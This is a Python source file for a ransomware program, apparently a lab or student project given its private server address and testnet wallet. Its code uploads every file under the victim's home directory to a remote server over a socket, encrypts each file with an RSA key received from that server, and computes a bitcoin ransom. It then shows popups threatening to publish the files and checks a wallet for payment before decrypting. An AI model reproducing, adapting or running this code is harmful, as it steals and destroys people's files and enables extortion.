import os
from os.path import expanduser
from cryptography.fernet import Fernet
import subprocess
import time
import signal
import base64
import logging
import socket
import math
import rsa
import requests
import re
import tempfile

class Ransomware: 
    """ This class represents a ransomware that will be executed once the link is clicked."""
    # IP address of the server
    SERVER_IP = "10.0.2.5"
    # Format of encoding for the messages and files sent over the TCP connection
    ENCODING = "utf-8"
    # The buffer size when receiving the data
    MAX_SIZE = 4096

    global bitcoin_needed, wallet_address, initial_balance
    bitcoin_needed = 1; # Instantiate the amount of bitcoin needed
    wallet_address = 'tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv' # Address of attackers wallet
    initial_balance = 0

    def __init__(self, number, directory):
        """Once the object of the class has been made, the port number and TCP connection will be initialized."""
        # Construct hostname of the remote server from the first two arguments.
        self._host = self.SERVER_IP
        # Calculate the port number from the last argument.
        self._port = self.decode_port(number)
        # Initialize socket for the connection.
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Initialize the root directory on the victim's machine
        self._directory = directory 

    @property
    def host(self):
        # Server that sends us the malicious code.
        return self._host

    @host.setter
    def host(self, new_host):
        self._host = new_host

    @property
    def port(self):
        # Port, on which the server runs (`int`).
        return self._port

    @port.setter
    def port(self, new_port):
        self._port = new_port

    def decode_port(self, port):
        # Returns target port of the remote server.
        return int(math.sqrt(port))

    @property
    def socket(self):
        # Returns the client socket.
        return self._socket


    def send_file_to_server(self, file_path, filename):    
        # Opening and reading the file data.
        file = open(file_path, "r", encoding = "ISO-8859-1")

        # Sending the filename to the server.
        self._socket.sendall(base64.b64encode(filename.encode(Ransomware.ENCODING)))
        time.sleep(0.01)
        msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)

        while True:
            data = file.read(1024)
            if not data:
                break
            # Sending the file data to the server.
            self._socket.sendall(base64.b64encode(data.encode(Ransomware.ENCODING)))
            msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)

        # Closing the file.
        file.close()
        
        time.sleep(0.01)
        self._socket.send(base64.b64encode("FILEDONE\n".encode(Ransomware.ENCODING)))
        msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)


    def get_balance(self, wallet_address):
        """ Retrieves the balance of the crypto wallet using the URL."""
        balance_url = "https://live.blockcypher.com/btc-testnet/address/" + wallet_address
        decimal_pattern = r'\d+\.\d+'


        # Make API request to retrieve wallet balance
        response = requests.get(balance_url)
        if response.status_code == 200:
            response_text = response.text
            index =  response_text.find("balance of")
            balance_str = response_text[index+11:index + 20]
            match = re.search(decimal_pattern, balance_str)
            balance = float(match.group())
            return balance
        return 1


    def check_if_user_has_paid(self, initial_bal):
        """Checks if a user has paid, if somebody has paid then it returns true, if nobody has it returns false."""
        current_balance = self.get_balance(wallet_address)
        change = current_balance - initial_bal
        
        print('Payment has been made: '+ str(change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001))

        # Checks whether the payment has been made.
        if (change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001):
            return True
        else:
            global initial_balance
            initial_balance = current_balance
            return False
        


    def list_safe_directories(self, directory):
        """ Lists all of the non-hidden, non-vital directories below the parameter directory."""
        result = []
        excluded_dirs = set([".", "..", ".Trash-1000", ".config", ".local", ".cache"])

        # Go through all of the directories and exlcude the ones in the excluded_dirs set
        for root, dirs, _ in os.walk(directory):
            dirs[:] = [d for d in dirs if not d.startswith(".") and d not in excluded_dirs]

            result.append(root)
            for directory in dirs:
                result.append(os.path.join(root, directory))

        return result

    def get_files_in_dir(self, directory):
        """ Retrieves all of the files in a directory and purposely does not include the ransomeware or other important files."""
        # Change to home directory so that the paths are correct relative paths.
        os.chdir(directory)

        files = []
        for file in os.listdir(directory):
            # We do not want to encrypt our own ransomware
            if file == "mal.py" or file == "public_key.pem" or file == "private_key.pem" or file == ".xsession-errors":
                continue
            if os.path.isfile(file):
                files.append(file)

        return files

    def establish_connection(self):
        """ Create a connection to the server. """
        try:
            print('Connection established to the server')
            self.socket.connect((self._host, self._port))
        except socket.error:
            return



    # Method for encrypting a single file
    def encrypt_file(self, file, key):
        with open(file, "rb") as the_file:
            contents = the_file.read()
            
        opened = False
        # Read the message in chunks
        for i in range(0, len(contents), 245):
            chunk = contents[i:i+245]
            enc_chunk = rsa.encrypt(chunk, key)

            # Update the file with the encrypted contents
            if not opened:
                with open(file, "wb") as f:
                    f.write(enc_chunk)
                    opened = True
            else:
                with open(file, "ab") as f:
                    f.write(enc_chunk)
                    
    def calulate_bitcoin(self, size_of_files):
        # Calculate number of bitcoin needed to be paid.
        global bitcoin_needed
        bitcoin_needed = str((size_of_files/100000000))

    # Encrypt all the safe to encrypt files on a victims pc
    def encrypt_and_send_all_files(self, directory, key):

        number_of_files = 0
        size_of_files = 0

        dir_list = self.list_safe_directories(directory)
        for dir in dir_list:
            for file in self.get_files_in_dir(dir):
                file_path = os.path.join(dir, file)
                file_size = os.path.getsize(file_path)
                size_of_files += file_size
                number_of_files += 1
                

                # Send file to server
                self.send_file_to_server(file_path, file)
                
                # Encrypt file
                self.encrypt_file(file_path, key)

                print("Encrypted and sent "+file)

        
        self._socket.sendall(base64.b64encode("DONE.".encode(Ransomware.ENCODING)))

        print("Number of files encrypted: " + str(number_of_files))
        print("Total size of files: " + str(size_of_files))
        
        #Update the amount of bitcoin that we want glboabbly
        self.calulate_bitcoin(size_of_files)
        print('Bitcoins to be paid: '+bitcoin_needed)

    def decrypt_file(self, file_path, key):
        "Decrypts a file."
        with open(file_path, "rb") as file:
            encrypted_contents = file.read()

        opened = False
        # Read the encrypted message in chunks
        for i in range(0, len(encrypted_contents), 256):
            chunk = encrypted_contents[i:i+256]

            try:
                dec_chunk = rsa.decrypt(chunk, key)

                # Update the file with the decrypted contents
                if not opened:
                    with open(file_path, "wb") as file:
                        file.write(dec_chunk)
                        opened = True
                else:
                    with open(file_path, "ab") as file:
                        file.write(dec_chunk)
                
            except:
                print('Sorry-----------------------')
                print(file_path)

            
    def decrypt_all_files(self, directory, key):
        "Decrypting all the files that is in the safe directories."
        dir_list = self.list_safe_directories(directory)
        for dir in dir_list:
            for file in self.get_files_in_dir(dir):
                if not os.path.exists(os.path.join(dir, 'private_key.pem')):
                    file_path = os.path.join(dir, file)
                    self.decrypt_file(file_path, key)

    def execute_attack(self):
        """Attacks the victims machine by receiving the public key to encrypt all the files."""

        self.establish_connection()
        
        """ Receiving the public key. """
        filename = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode("utf-8")
        file = open(filename, "w")
        self._socket.sendall(base64.b64encode("Public key filename received.".encode("utf-8")))
 
        """ Receiving the public key from the server. """
        data = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode("utf-8")
        file.write(data)
        print("Received public key")
        self._socket.sendall(base64.b64encode("File data received".encode("utf-8")))
 
        """ Closing the file. """
        file.close()

        #Read the public key from the server
        with open("public_key.pem", "rb") as key_content:
            key = rsa.PublicKey.load_pkcs1(key_content.read())

        #Encrypt all files
        self.encrypt_and_send_all_files(self._directory, key)


        #Send the amount of bitcoins we need to have to server
        self._socket.sendall(base64.b64encode(bitcoin_needed.encode("utf-8")))


        start_time = time.time()
        remaining_time = 86400 #24 hours 


        counter = 1
        while (remaining_time > 0):
            counter += 1
        # Format the remaining time as hours, minutes and seconds
            hours = int(remaining_time // 3600)
            minutes = int((remaining_time%3600) // 60)
            seconds = int(remaining_time % 60)


            # Text to be displayed on the pop up
            text = f"HAHAHAHA, all your files are encrypted and stored on our server!\n If you pay us in the next <b>{hours:02d}:{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\n If you do not pay us, the files will be published to the internet for all to see.\n DO NOT TURN OFF YOUR COMPUTER - WE WILL CONSDIER THIS AS NON PAYMENT \nTransfer: {bitcoin_needed} btc to {wallet_address}"

            # Show the dialog with the remaining time, keep refreshing the window.
            popup = subprocess.Popen(["zenity", "--warning", "--text", text,"--width", "400", "--height", "200" ])

            # Update the remaining time
            elapsed_time = time.time() - start_time
            remaining_time = 86400 - elapsed_time
            time.sleep(1)
            popup.send_signal(signal.SIGTERM)

            

            #Only check if they have paid every 1 mins
            if (counter == 60):
                counter = 1

                if (self.check_if_user_paid(initial_balance)):
                    # Waits until all the files has been uploaded before processing the payment   

                    popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
                
                    """ Receiving the private key. """
                    filename = base64.b64decode(self._socket.recv(2048)).decode(Ransomware.ENCODING)
                    filename = 'private_key.pem'

                    key = open(filename, "wb")
                    self._socket.sendall(base64.b64encode("Private key filename received.".encode(Ransomware.ENCODING)))
        
                    """ Receiving the private key from the server. """
                    data = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE))
                
                    print("Received public key")
                    key.write(data)
                    self._socket.sendall(base64.b64encode("File Data recieved.".encode(Ransomware.ENCODING)))
                
                    """ Closing the file. """
                    key.close()

                    #Read the private key from the server
                    with open("private_key.pem", "rb") as key_content:
                        key = rsa.PrivateKey.load_pkcs1(key_content.read())

                    self.decrypt_all_files(home, key)

                    self._socket.sendall(base64.b64encode("x".encode("utf-8")))
                    break
                
            subprocess.Popen(["zenity", "--info", "--text", "TIMER HAS RUN OUT. \n Publishing your files to the internet","--width", "400", "--height", "200" ])

#Main function / control flow
if __name__ == '__main__':

    # Home directory
    home = expanduser("~")

    logging.basicConfig(level=logging.DEBUG)

    # Initialize Ransomware
    ransomware = Ransomware(729000000, home)
    

    # Start the attack
    ransomware.execute_attack()
